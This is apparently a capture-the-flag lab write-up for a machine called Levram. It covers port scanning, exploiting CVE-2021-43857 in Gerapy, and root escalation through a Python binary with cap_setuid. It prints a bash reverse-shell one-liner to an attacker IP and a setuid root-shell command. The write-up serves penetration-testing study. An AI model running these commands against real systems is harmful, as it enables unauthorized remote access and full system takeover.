---
description: Privilege Escalation via Python Binary with cap_setuid
icon: linux
---

# Levram

## Summary

* Discovered only two open ports: SSH (22) and a web server (8000) running Gerapy.
* Gerapy was running a **vulnerable version**, which led to authenticated command execution.
* Exploited CVE-2021-43857 to gain an initial foothold.
* Privilege escalation achieved using **cap\_setuid capability assigned to Python3 binary**, allowing elevation to root.



## 🧵 Let's Unpack

***

**Enumeration**

```bash
sudo nmap -A -T4 -sV -sC -p- -Pn 192.168.229.24 --open
```

Open Ports:

* `22/tcp` → OpenSSH 8.9p1 Ubuntu
* `8000/tcp` → Gerapy (WSGIServer/0.2 CPython/3.10.6)

📌 **Interesting Findings**:

* Gerapy panel hosted on port 8000.
* Web title confirmed it was running **Gerapy**.
* `robots.txt` or web paths not exposed; had to manually verify version and exploit.

***

**Initial Foothold**

* Used public exploit for Gerapy RCE:\
  → [CVE-2021-43857](https://github.com/LongWayHomie/CVE-2021-43857)
* The exploit chain allowed **remote code execution** by abusing insecure project configuration and file inclusion.

```bash
# Executed payload for reverse shell
bash -i >& /dev/tcp/192.168.45.240/9999 0>&1
```

* ✅ Received reverse shell from Gerapy web context.

***

**Privilege Escalation**

```bash
getcap -r / 2>/dev/null
>
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

Found this:

```
/usr/bin/python3.10 cap_setuid=ep
```

* This capability allows the binary to change its user ID — effectively enabling **escalation to root**.

From [GTFOBins – Python](https://gtfobins.github.io/gtfobins/python/#capabilities):

```bash
python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

* 🧨 Boom! Got a root shell.

```bash
# Upgraded shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

***
